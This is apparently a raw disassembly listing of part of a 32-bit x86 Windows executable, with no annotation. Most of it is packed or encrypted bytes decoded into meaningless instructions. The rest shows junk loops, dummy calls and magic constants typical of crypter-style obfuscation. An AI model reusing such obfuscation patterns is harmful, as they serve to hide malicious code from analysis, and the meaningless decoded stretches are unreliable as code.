  404808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404809:	xchg   DWORD PTR [ecx-0x6],ebx
  40480c:	ins    DWORD PTR es:[edi],dx
  40480d:	xor    ah,BYTE PTR gs:[eax+0x17]
  404811:	mov    ebx,0xe51ceb88
  404816:	jnp    0x404820
  404818:	mov    ecx,0x5ed505e6
  40481d:	xor    al,0x49
  40481f:	lock icebp 
  404821:	rcl    BYTE PTR [edi-0x80],0xd7
  404825:	stos   DWORD PTR es:[edi],eax
  404826:	lods   al,BYTE PTR ds:[esi]
  404827:	cmp    BYTE PTR [ecx],0xeb
  40482a:	dec    esi
  40482b:	jo     0x4047b8
  40482d:	xchg   edi,eax
  40482e:	aas    
  40482f:	cs repz mov al,0xcd
  404833:	and    al,0x13
  404835:	jno    0x404883
  404837:	cli    
  404838:	adc    DWORD PTR [esi],ecx
  40483a:	pop    ss
  40483b:	sub    dl,0x66
  40483e:	dec    ebx
  40483f:	dec    ebp
  404840:	cmc    
  404841:	jg     0x40481e
  404843:	sbb    al,0xee
  404845:	icebp  
  404846:	xor    eax,0xe421890b
  40484b:	ja     0x404862
  40484d:	push   eax
  40484e:	sar    ecx,0x5a
  404851:	xor    esp,DWORD PTR [edx+0x2e]
  404854:	in     eax,0xed
  404856:	mov    bh,0xa3
  404858:	adc    edi,0x8939bb6c
  40485e:	and    dh,bh
  404860:	retfw  0xe719
  404864:	push   ebx
  404865:	cmp    ebx,ebx
  404867:	pop    ebx
  404868:	jp     0x40482a
  40486a:	jae    0x4048db
  40486c:	mov    ?,WORD PTR [ebx]
  40486e:	imul   ebx,DWORD PTR [eax-0x365f278],0xffffff85
  404875:	fcom   DWORD PTR [eax-0x5470db8d]
  40487b:	adc    al,0xff
  40487d:	inc    esp
  40487e:	fadd   QWORD PTR [ebp+0x361ce002]
  404884:	push   cs
  404885:	pop    esi
  404886:	jo     0x4048ca
  404888:	inc    eax
  404889:	push   esp
  40488a:	or     al,0x3e
  40488d:	mov    ebx,0xf217eea6
  404892:	and    bl,bl
  404894:	fwait
  404895:	xor    DWORD PTR [esp+edi*4],0xfffffff1
  404899:	pop    ds
  40489a:	jns    0x4048eb
  40489c:	or     BYTE PTR [ecx],dl
  40489e:	pop    esi
  40489f:	aaa    
  4048a0:	and    dl,BYTE PTR [esi]
  4048a2:	arpl   WORD PTR [edi],dx
  4048a4:	fnstenv [edx+0x11]
  4048a7:	jo     0x4048ec
  4048a9:	mov    bh,0xea
  4048ab:	or     cl,BYTE PTR [eax-0x16]
  4048ae:	jno    0x404855
  4048b0:	ds xchg esi,eax
  4048b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048b3:	ja     0x404870
  4048b5:	popa   
  4048b6:	idiv   DWORD PTR [ebp-0x1f6f5325]
  4048bc:	popf   
  4048bd:	test   ah,ch
  4048bf:	xor    dh,BYTE PTR [eax+0x7a8028ac]
  4048c5:	and    DWORD PTR [ecx-0x4],edi
  4048c8:	arpl   WORD PTR [eax+0x36b5a9c6],cx
  4048ce:	lds    ebx,FWORD PTR [edi+0x537fff3d]
  4048d4:	xor    DWORD PTR [eax],eax
  4048d6:	xchg   edx,eax
  4048d7:	test   DWORD PTR [esi],ebx
  4048d9:	scas   al,BYTE PTR es:[edi]
  4048da:	ins    BYTE PTR es:[edi],dx
  4048db:	int3   
  4048dc:	test   al,0x8f
  4048de:	sub    cl,BYTE PTR [ebp*2+0x575cac4d]
  4048e5:	imul   ebp,DWORD PTR [esi+0x2a],0x654bff5c
  4048ec:	ret    
  4048ed:	stos   DWORD PTR es:[edi],eax
  4048ee:	add    eax,0x59da8f7f
  4048f3:	cli    
  4048f4:	xchg   edi,eax
  4048f5:	ret    
  4048f6:	dec    ebp
  4048f7:	out    dx,eax
  4048f8:	cmp    BYTE PTR [eax+esi*4],0x2b
  4048fc:	and    ah,BYTE PTR [edx+0x71]
  4048ff:	popf   
  404900:	mov    bl,0x49
  404902:	je     0x4048d6
  404904:	ret    0xa4a4
  404907:	imul   ebp,DWORD PTR [edx],0xddea2f22
  40490d:	sbb    ch,BYTE PTR [edx+ecx*8]
  404910:	in     eax,0x2d
  404912:	fs (bad) 
  404914:	retf   0x1a04
  404917:	lea    ecx,[edi+0x76]
  40491a:	or     ebx,DWORD PTR [esi]
  40491c:	mov    edx,0xdeb53ae2
  404921:	ret    0x28e1
  404924:	fnstsw WORD PTR [eax]
  404926:	(bad)  
  404928:	sbb    BYTE PTR [edi-0xce3df27],al
  40492e:	je     0x404912
  404930:	pop    ebp
  404931:	dec    esi
  404932:	push   ds
  404933:	fnstenv [ebx-0x74e013ca]
  404939:	aam    0xcc
  40493b:	sbb    BYTE PTR [edx+0x4e7674f2],ah
  404941:	mov    ds:0x8f8464b2,eax
  404946:	mov    ebx,DWORD PTR [edx+0x17]
  404949:	leave  
  40494a:	(bad)  [ecx+0x1ad27d99]
  404950:	loopne 0x404967
  404952:	out    0x9b,eax
  404954:	cli    
  404955:	clc    
  404956:	jecxz  0x40493d
  404958:	addr16 cmp al,0x8d
  40495b:	jmp    0x4048f1
  40495d:	out    dx,al
  40495e:	retf   0x1734
  404961:	jns    0x4049cc
  404963:	sub    eax,DWORD PTR [eax]
  404965:	imul   esi,DWORD PTR [edi+0x3],0xffffffc0
  404969:	or     DWORD PTR [eax],edx
  40496b:	pop    esi
  40496c:	ror    WORD PTR [edx-0x53],0x32
  404971:	outs   dx,BYTE PTR ds:[esi]
  404972:	sub    BYTE PTR [edx],bh
  404974:	cmp    al,0x6e
  404976:	and    eax,edx
  404978:	retf   
  404979:	loop   0x40492c
  40497b:	add    BYTE PTR [eax+ebx*4-0x2b1f0a82],al
  404982:	mov    ebp,0x2f063af0
  404987:	jecxz  0x404975
  404989:	or     eax,DWORD PTR [edx]
  40498b:	lods   al,BYTE PTR ds:[esi]
  40498c:	aam    0x2d
  40498e:	in     al,0xcf
  404990:	mov    ecx,0x63abf8b8
  404995:	mov    edi,ebp
  404997:	or     BYTE PTR [ebx],dl
  404999:	add    al,0xa3
  40499b:	mov    esi,DWORD PTR [ebx+0x79]
  40499e:	cmp    dh,BYTE PTR [ebx+0x41fcdf2]
  4049a4:	std    
  4049a5:	jecxz  0x4049a0
  4049a7:	cmp    cl,al
  4049a9:	mov    fs,WORD PTR [edx+0x54dd907d]
  4049af:	shl    ebx,1
  4049b1:	sbb    DWORD PTR [eax],0x874e7f6b
  4049b7:	stos   BYTE PTR es:[edi],al
  4049b8:	inc    ecx
  4049b9:	and    BYTE PTR [esi+0x2e95df],al
  4049bf:	(bad)  [esi-0x74]
  4049c2:	(bad)  
  4049c3:	aam    0xc9
  4049c5:	xor    al,0x7e
  4049c7:	mov    bh,0x8e
  4049c9:	xlat   BYTE PTR ds:[ebx]
  4049ca:	loopne 0x40495b
  4049cc:	fimul  DWORD PTR [esi]
  4049ce:	push   es
  4049cf:	push   ds
  4049d0:	out    0xf9,eax
  4049d2:	or     eax,0xb87bf479
  4049d7:	pop    eax
  4049d8:	jge    0x40499b
  4049da:	xlat   BYTE PTR ds:[ebx]
  4049db:	push   ss
  4049dc:	mov    ah,0x68
  4049de:	mov    esi,0x619a340f
  4049e3:	jmp    0x6ddb5de0
  4049e8:	cmp    ch,dh
  4049ea:	or     bh,BYTE PTR [edi+ebx*2+0x7fb7a98b]
  4049f1:	addr16 sti 
  4049f3:	and    BYTE PTR [ebp-0x1f112336],ch
  4049f9:	mov    eax,ds:0x10b03b72
  4049fe:	and    eax,0x74e5e58
  404a03:	push   es
  404a04:	inc    esi
  404a05:	loope  0x404a6c
  404a07:	cwde   
  404a08:	pop    ebp
  404a09:	or     bh,BYTE PTR [edx-0x45]
  404a0c:	hlt    
  404a0d:	mov    dh,0x35
  404a0f:	jb     0x4049d6
  404a11:	cmp    eax,0x25b96056
  404a16:	lock sbb bh,BYTE PTR [ebx]
  404a19:	(bad)  
  404a1c:	lds    ebx,FWORD PTR [ebx+0x7ab300a2]
  404a22:	outs   dx,BYTE PTR ds:[esi]
  404a23:	cmp    edi,DWORD PTR [edi]
  404a25:	cmp    eax,ecx
  404a27:	and    DWORD PTR [edi-0x5c],esp
  404a2a:	push   cs
  404a2b:	push   ebp
  404a2c:	cld    
  404a2d:	jo     0x4049b5
  404a2f:	mov    dh,BYTE PTR [ecx+ecx*2-0x69b6713f]
  404a36:	push   edi
  404a37:	or     esi,DWORD PTR [ebp+0xc]
  404a3a:	test   DWORD PTR [esi-0x70fa9397],eax
  404a40:	push   edx
  404a41:	jbe    0x404a41
  404a43:	mov    cl,0xdb
  404a45:	outs   dx,BYTE PTR ds:[esi]
  404a46:	(bad)  [ebp+0x27]
  404a49:	in     eax,dx
  404a4a:	loope  0x4049ed
  404a4c:	jmp    0x404ac8
  404a4e:	xor    al,0xf1
  404a50:	mov    ecx,0xf073baf
  404a55:	jle    0x404a2e
  404a57:	std    
  404a58:	mov    ch,0x86
  404a5a:	dec    eax
  404a5b:	jbe    0x404a5a
  404a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5e:	sar    dl,1
  404a60:	iretw  
  404a62:	retf   
  404a63:	in     eax,0x91
  404a65:	add    eax,DWORD PTR [ebp-0x6e]
  404a68:	lahf   
  404a69:	sbb    al,0x2a
  404a6b:	out    dx,al
  404a6c:	sub    BYTE PTR [eax-0x6a],ah
  404a6f:	pop    edi
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x4338bf,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x433837
  404a94:	and    DWORD PTR ds:0x433883,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x4337ab,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x4337eb
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x4338ab,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x433843,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x433843
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x433843,edi
  404adf:	cmp    DWORD PTR ds:0x433843,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x433843,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x433843
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x433843,edi
  404b0f:	cmp    DWORD PTR ds:0x433843,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x4d071ccd]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	femms  
  404b3b:	frstor [edi+0x239c8943]
  404b41:	sub    edx,DWORD PTR [eax]
  404b43:	sub    eax,0x3f6364b5
  404b48:	call   0xf5ea26dc
  404b4d:	mov    ebp,edx
  404b4f:	adc    BYTE PTR [ebp+0x5677e72b],dl
  404b55:	scas   eax,DWORD PTR es:[edi]
  404b56:	(bad)  
  404b57:	xchg   ebx,eax
  404b58:	cld    
  404b59:	push   esi
  404b5a:	push   0xfffffff5
  404b5c:	or     al,0x85
  404b5e:	addr16 loop 0x404bae
  404b61:	cmp    edi,DWORD PTR [ebx+0x4e0ded0e]
  404b67:	sub    BYTE PTR [ecx-0x32f48c10],dh
  404b6d:	pop    ebp
  404b6e:	jecxz  0x404ba6
  404b70:	jmp    0x404bf1
  404b72:	fdiv   QWORD PTR [ecx]
  404b74:	in     eax,0xaf
  404b76:	cmp    al,0x59
  404b78:	jno    0x404b06
  404b7a:	xchg   edx,eax
  404b7b:	daa    
  404b7c:	pusha  
  404b7d:	fmul   QWORD PTR [ebx-0x72]
  404b80:	add    BYTE PTR ss:[edx],al
  404b83:	aad    0xf8
  404b85:	xchg   esp,eax
  404b86:	cld    
  404b87:	imul   esp,eax,0x378ed98b
  404b8d:	in     al,dx
  404b8e:	xchg   edi,eax
  404b8f:	daa    
  404b90:	mov    esi,0xc8d82df8
  404b95:	mov    al,ds:0xa97eb182
  404b9a:	push   ds
  404b9b:	add    eax,DWORD PTR [ecx]
  404b9d:	push   edx
  404b9e:	or     edi,DWORD PTR [esi+0x9a6024]
  404ba4:	mov    DWORD PTR [esi],eax
  404ba6:	outs   dx,BYTE PTR ds:[esi]
  404ba7:	dec    esp
  404ba8:	daa    
  404ba9:	and    eax,0x679d5096
  404bae:	dec    ebp
  404baf:	fwait
  404bb0:	mov    ecx,0x63f91c9d
  404bb5:	sub    DWORD PTR [ebp+0x4],ecx
  404bb8:	xchg   ecx,eax
  404bb9:	jae    0x404b5b
  404bbb:	add    DWORD PTR [esi-0x21],0xffffff9e
  404bbf:	jle    0x404b86
  404bc1:	mov    ch,0x44
  404bc3:	jl     0x404bc0
  404bc5:	stos   DWORD PTR es:[edi],eax
  404bc6:	mov    esp,0x48b66507
  404bcb:	lock dec eax
  404bcd:	dec    esi
  404bce:	fcom   st(4)
  404bd0:	mov    bh,0x82
  404bd2:	hlt    
  404bd3:	xchg   BYTE PTR [ebx],bh
  404bd5:	cmp    BYTE PTR [esp+esi*4+0x2b],cl
  404bd9:	test   esp,esi
  404bdb:	and    DWORD PTR [edx+0x5c],0x2
  404bdf:	or     al,0x17
  404be1:	enter  0xbfd5,0x42
  404be5:	or     DWORD PTR [ebp-0x6501eccc],0x32
  404bec:	or     esp,ecx
  404bee:	xchg   ebp,eax
  404bef:	clc    
  404bf0:	push   edx
  404bf1:	mov    cl,0x3c
  404bf3:	mov    esp,0x9e1281be
  404bf8:	ins    BYTE PTR es:[edi],dx
  404bf9:	pop    ss
  404bfa:	dec    ebp
  404bfb:	arpl   ax,bx
  404bfd:	mov    BYTE PTR [ebp+0x34],bl
  404c00:	std    
  404c01:	xchg   ebp,eax
  404c02:	gs repnz or al,0x70
  404c06:	mov    dl,0x75
  404c08:	xchg   ebp,eax
  404c09:	sub    BYTE PTR [edx-0x50],bl
  404c0c:	rol    DWORD PTR [ecx-0x7c],0x7c
  404c10:	push   es
  404c11:	cld    
  404c12:	or     al,0x34
  404c14:	in     eax,0xc
  404c16:	lea    edi,[esi]
  404c18:	js     0x404c22
  404c1a:	and    eax,DWORD PTR [ecx]
  404c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c1d:	clc    
  404c1e:	shl    DWORD PTR ds:0xf85e55c8,cl
  404c24:	mov    bl,0xb5
  404c26:	or     BYTE PTR cs:[esi+0x50],0xd5
  404c2b:	mov    eax,ds:0xb3358e6f
  404c30:	(bad)  
  404c31:	(bad)  
  404c32:	daa    
  404c33:	jmp    0xc8aba15
  404c38:	mov    bh,0xde
  404c3a:	mov    ebp,0x4b3bbcf4
  404c3f:	sar    BYTE PTR [edx-0x6cd84e34],0xf2
  404c46:	(bad)  [esi+eiz*4]
  404c49:	mov    bh,0x8f
  404c4b:	pop    esp
  404c4c:	dec    ebx
  404c4d:	mov    DWORD PTR [ebx-0x2994a5e3],0xa513b414
  404c57:	inc    edx
  404c58:	adc    DWORD PTR [edx-0x23097b79],esp
  404c5e:	in     eax,0x41
  404c60:	cmp    BYTE PTR [esi+0x5b373b50],0xb6
  404c67:	outs   dx,BYTE PTR ds:[esi]
  404c68:	popf   
  404c69:	jl     0x404c27
  404c6b:	dec    esp
  404c6c:	out    0xe3,eax
  404c6e:	xchg   ecx,eax
  404c6f:	pop    edi
  404c70:	lahf   
  404c71:	xor    eax,0xc822f05f
  404c76:	addr16 dec ebx
  404c78:	out    0x92,eax
  404c7a:	in     al,dx
  404c7b:	jp     0x404c82
  404c7d:	jo     0x404c1f
  404c7f:	mov    esi,0x2c732a0b
  404c84:	loopne 0x404ccc
  404c86:	jbe    0x404c5b
  404c88:	out    0x32,eax
  404c8a:	jg     0x404c66
  404c8c:	xchg   esp,eax
  404c8d:	mov    dh,0x28
  404c8f:	pop    es
  404c90:	fstp   DWORD PTR [edi]
  404c92:	lock mov al,0x31
  404c95:	seta   BYTE PTR [edi-0x6f52e3cd]
  404c9c:	pop    ecx
  404c9d:	and    eax,0x73ead262
  404ca2:	into   
  404ca3:	retf   0x505e
  404ca6:	mov    ebp,DWORD PTR [edx]
  404ca8:	sbb    bl,ah
  404caa:	or     ecx,eax
  404cac:	sbb    al,0xf8
  404cae:	or     eax,DWORD PTR [edi]
  404cb0:	inc    esi
  404cb1:	retf   
  404cb2:	dec    ebx
  404cb3:	(bad)  
  404cb4:	or     esp,esi
  404cb6:	ds pushf 
  404cb8:	pop    edx
  404cb9:	das    
  404cba:	adc    DWORD PTR [edx+0x25],eax
  404cbd:	lock ja 0x404cfb
  404cc0:	push   cs
  404cc1:	enter  0x9cf1,0x8d
  404cc5:	mov    ebp,0x41965053
  404cca:	out    dx,eax
  404ccb:	pop    edi
  404ccc:	fs inc ecx
  404cce:	fdivr  DWORD PTR [esi-0x4144d5b5]
  404cd4:	fnstenv ds:0x64abad58
  404cda:	pusha  
  404cdb:	inc    edi
  404cdc:	aad    0x1e
  404cde:	aaa    
  404cdf:	push   ebx
  404ce0:	pop    edx
  404ce1:	scas   eax,DWORD PTR es:[edi]
  404ce2:	and    ebp,ecx
  404ce4:	mov    bh,0xe8
  404ce6:	jge    0x404d28
  404ce8:	into   
  404ce9:	xchg   esi,eax
  404cea:	out    dx,eax
  404ceb:	arpl   WORD PTR [ebx+0x6e],bp
  404cee:	idiv   esi
  404cf0:	dec    esp
  404cf1:	in     al,dx
  404cf2:	je     0x404ced
  404cf4:	pop    ecx
  404cf5:	les    edi,FWORD PTR [ebx]
  404cf7:	int    0x56
  404cf9:	adc    dl,BYTE PTR [ebx+ebp*8]
  404cfc:	mov    cl,0xdc
  404cfe:	or     ebx,DWORD PTR [esi+esi*8]
  404d01:	fcom   DWORD PTR [esi-0x461c246f]
  404d07:	lods   eax,DWORD PTR ds:[esi]
  404d08:	or     ch,cl
  404d0a:	out    dx,al
  404d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d0c:	adc    eax,0x689af29b
  404d11:	(bad)  
  404d12:	(bad)  
  404d13:	jnp    0x404ca0
  404d15:	push   ss
  404d16:	lock add al,0xd9
  404d19:	or     al,BYTE PTR [esi]
  404d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d1c:	and    BYTE PTR [ecx+0x40e2df2],cl
  404d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d23:	jno    0x404d68
  404d25:	cmp    ebx,DWORD PTR [edx+0x0]
  404d28:	and    al,0x9a
  404d2a:	jl     0x1125830f
  404d30:	cmp    BYTE PTR [esi],bh
  404d32:	std    
  404d33:	ins    DWORD PTR es:[edi],dx
  404d34:	jnp    0x404cbe
  404d36:	jge    0x404d86
  404d38:	out    dx,al
  404d39:	push   esi
  404d3a:	popa   
  404d3b:	ret    
  404d3c:	jge    0x404d0b
  404d3e:	lds    ebx,FWORD PTR [esi+0x66a2ec2d]
  404d44:	mov    esp,0x101130d6
  404d49:	rcr    BYTE PTR [ebp+0x308cdc79],0x1c
  404d50:	repz and BYTE PTR [ebx],cl
  404d53:	leave  
  404d54:	pop    ecx
  404d55:	cli    
  404d56:	pusha  
  404d57:	pop    ss
  404d58:	lods   eax,DWORD PTR ds:[esi]
  404d59:	xor    edi,ecx
  404d5b:	xor    eax,0x1b103f04
  404d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d61:	fild   QWORD PTR [eax+0x2254ae1e]
  404d67:	int    0xed
  404d69:	inc    eax
  404d6a:	ret    0xf986
  404d6d:	cli    
  404d6e:	ds (bad) 
  404d70:	lahf   
  404d71:	inc    ebp
  404d72:	adc    DWORD PTR [eax+0x62750765],ecx
  404d78:	fsubr  DWORD PTR [esi+0xc]
  404d7b:	cmp    al,0x1f
  404d7d:	or     eax,0xb3afae96
  404d82:	rcl    BYTE PTR [ebx],1
  404d84:	nop
  404d85:	jne    0x404de3
  404d87:	shl    DWORD PTR [edx-0x5179554d],cl
  404d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d8e:	push   eax
  404d8f:	fimul  DWORD PTR [eax]
  404d91:	(bad)  
  404d92:	lea    edi,[ecx]
  404d94:	jg     0x404dde
  404d96:	sahf   
  404d97:	or     BYTE PTR [edi-0x5279d091],bl
  404d9d:	pop    ss
  404d9e:	push   0xd0a18db1
  404da3:	jbe    0x404d32
  404da5:	mov    ecx,0xf81a8fc
  404daa:	icebp  
  404dab:	sbb    bh,BYTE PTR [edx]
  404dad:	into   
  404dae:	(bad)  
  404daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404db0:	lea    ecx,[eax]
  404db2:	sub    ch,al
  404db4:	repz es jmp 0x404dc5
  404db8:	arpl   WORD PTR [edx-0x47176c8b],sp
  404dbe:	(bad)  
  404dbf:	mov    bl,0xdf
  404dc1:	add    DWORD PTR [ebx],ebx
  404dc3:	ins    DWORD PTR es:[edi],dx
  404dc4:	sbb    DWORD PTR [ebx],eax
  404dc6:	mov    al,ds:0x6a9684ea
  404dcb:	adc    eax,0xc34bb220
  404dd0:	(bad)  
  404dd1:	or     ah,dl
  404dd3:	mov    ah,0x8a
  404dd5:	jmp    0xf665b4b9
  404dda:	loopne 0x404dc6
  404ddc:	mov    ch,BYTE PTR [ebx+ecx*4]
  404ddf:	push   0x23
  404de1:	mov    cl,0xb2
  404de3:	dec    ecx
  404de4:	and    DWORD PTR [ebx+0x3cc6aba4],eax
  404dea:	mov    ?,WORD PTR [ebx-0x6d]
  404ded:	or     al,0xa
  404def:	mov    al,ds:0x1068d237
  404df4:	pop    es
  404df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df6:	clc    
  404df7:	pop    ds
  404df8:	add    ecx,DWORD PTR [edx-0x50]
  404dfb:	add    al,BYTE PTR [eax-0x65]
  404dfe:	aaa    
  404dff:	gs ds stos DWORD PTR es:[edi],eax
  404e02:	popf   
  404e03:	(bad)  
  404e04:	leave  
  404e05:	xor    eax,0x3fd4cd41
  404e0a:	cmp    edi,DWORD PTR [eax-0x7c8c022]
  404e10:	adc    DWORD PTR [ecx],edx
  404e12:	aas    
  404e13:	retf   
  404e14:	pusha  
  404e15:	sbb    dh,bl
  404e17:	mov    WORD PTR [esp+ecx*4],gs
  404e1a:	xor    eax,0x575cafe2
  404e1f:	and    DWORD PTR [edi],esp
  404e21:	fisubr DWORD PTR ds:0x292b
  404e26:	mov    ds:0x6cb38e6b,eax
  404e2b:	retf   
  404e2c:	xchg   esp,eax
  404e2d:	inc    edi
  404e2e:	clc    
  404e2f:	iret   
  404e30:	scas   eax,DWORD PTR es:[edi]
  404e31:	ins    DWORD PTR es:[edi],dx
  404e32:	add    eax,0x80dce30a
  404e37:	or     bh,BYTE PTR [esi-0x33d1a935]
  404e3d:	shl    BYTE PTR [ebx-0x6aa47275],0x6a
  404e44:	mov    DWORD PTR [esi-0x35],ebx
  404e47:	iret   
  404e48:	rcl    BYTE PTR [ebp-0x14],0x0
  404e4c:	mov    dl,BYTE PTR [ebx+eiz*2-0x33fc44c4]
  404e53:	cmp    al,0x5b
  404e55:	cli    
  404e56:	adc    DWORD PTR ds:0xd622c0ea,ebx
  404e5c:	daa    
  404e5d:	xchg   edx,eax
  404e5e:	dec    edi
  404e5f:	jge    0x404ebb
  404e61:	mov    dh,BYTE PTR [ebx+0x58]
  404e64:	call   0xde07:0xa6ed9342
  404e6b:	fisttp DWORD PTR [ebx-0x33]
  404e6e:	mov    ds:0x87624291,eax
  404e73:	stos   BYTE PTR es:[edi],al
  404e74:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404e76:	mov    edx,DWORD PTR [ebp+0x8]
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43379b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x433867
  404e9e:	adc    DWORD PTR ds:0x4337ff,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x43386b,0x10
  404eb5:	cmp    DWORD PTR ds:0x43386b,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x43386b,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x43386b,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x43386b
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x43386b,edi
  404efc:	mov    edi,DWORD PTR ds:0x43386b
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x43386b,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x4338bf,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x43386b
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x43383f
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x4338bb,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x4338bb
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x4338bb,edi
  404f40:	cmp    DWORD PTR ds:0x4338bb,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x4338bb,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x4338bb
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x4338bb,edi
  404f72:	cmp    DWORD PTR ds:0x4338bb,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x4337b7,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x4337e7,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x43386f,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43378f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x4337e7
  404fc8:	and    DWORD PTR ds:0x433793,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x433867,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x4338af,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x4338b7,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x43386f,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x4337a7,0x0
  40502c:	mov    edi,DWORD PTR ds:0x4337a7
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x4337a7,edi
  405039:	cmp    DWORD PTR ds:0x4337a7,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x4337a7,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x4337a7
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x4337a7,edi
  405079:	cmp    DWORD PTR ds:0x4337a7,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x43387f
  40508e:	add    DWORD PTR ds:0x43383b,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x43386b,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x4338bb,0x49ec
  4050b6:	jb     0x40685e
